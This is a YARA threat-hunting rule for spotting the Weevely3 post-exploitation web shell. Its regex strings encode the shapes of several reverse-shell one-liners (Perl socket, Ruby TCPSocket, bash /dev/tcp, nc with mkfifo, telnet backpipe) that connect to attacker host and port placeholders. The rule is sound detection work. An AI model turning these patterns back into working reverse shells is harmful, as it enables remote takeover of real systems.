rule Weevely3
{
    meta:
        description = "Detection patterns for the tool 'Weevely3' taken from the ThreatHunting-Keywords github project" 
        author = "@mthcht"
        reference = "https://github.com/mthcht/ThreatHunting-Keywords"
        tool = "Weevely3"
        rule_category = "offensive_tool_keyword"

    strings:
        // Description: Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime
        // Reference: https://github.com/epinna/weevely3
        $string1 = /\/reversetcp\.py/ nocase ascii wide
        // Description: Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime
        // Reference: https://github.com/epinna/weevely3
        $string2 = /\/weevely\.py/ nocase ascii wide
        // Description: Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime
        // Reference: https://github.com/epinna/weevely3
        $string3 = "epinna/weevely3" nocase ascii wide
        // Description: Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime
        // Reference: https://github.com/epinna/weevely3
        $string4 = /perl\s\-e\s\'use\sSocket\;\$i\=\\"\$\{lhost\}\\"\;\$p\=\$\{port\}/ nocase ascii wide
        // Description: Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime
        // Reference: https://github.com/epinna/weevely3
        $string5 = /rm\s\-rf\s\/tmp\/backpipe\;mknod\s\/tmp\/backpipe\sp\;telnet\s.{0,1000}\s0\<\/tmp\/backpipe/ nocase ascii wide
        // Description: Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime
        // Reference: https://github.com/epinna/weevely3
        $string6 = /ruby\s\-rsocket\s\-e\'f\=TCPSocket\.open\(\\"\$\{lhost\}\\"\,\$\{port\}\)\.to_i/ nocase ascii wide
        // Description: Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime
        // Reference: https://github.com/epinna/weevely3
        $string7 = /sleep\s1\;\s\/bin\/bash\s\-c\s\\\'\$\{shell\}\s0\<\/dev\/tcp\/\$\{lhost\}\/\$\{port\}\s1\>\&0\s2\>\&0/ nocase ascii wide
        // Description: Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime
        // Reference: https://github.com/epinna/weevely3
        $string8 = /sleep\s1\;\srm\s\-rf\s\/tmp\/f\;mkfifo\s\/tmp\/f\;cat\s\/tmp\/f\|\$\{shell\}\s\-i\s2\>\&1\|nc\s\$\{lhost\}\s\$\{port\}\s\>\/tmp\/f/ nocase ascii wide
        // Description: Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime
        // Reference: https://github.com/epinna/weevely3
        $string9 = "weevely generate " nocase ascii wide

    condition:
        any of them
}
